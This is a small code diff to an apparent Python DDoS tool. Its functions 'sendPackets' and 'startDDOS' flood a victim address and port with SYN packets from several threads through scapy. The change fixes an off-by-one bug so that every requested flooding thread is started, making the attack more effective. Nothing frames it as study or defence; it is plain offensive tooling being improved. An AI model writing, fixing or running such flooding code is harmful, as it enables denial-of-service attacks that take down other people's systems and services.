@@ -10,6 +10,6 @@ def sendPackets(victimAddress,victimPort):
 			ans,unans=srloop(packetSYN,inter=0.1,retry=2,timeout=4)
 
 def startDDOS(victimAddress,victimPort,numThreads):
-	for i in range(1,numThreads):
+	for i in range(numThreads):
 		thread = Thread(target=sendPackets,args=(victimAddress,victimPort))
 		thread.start()	
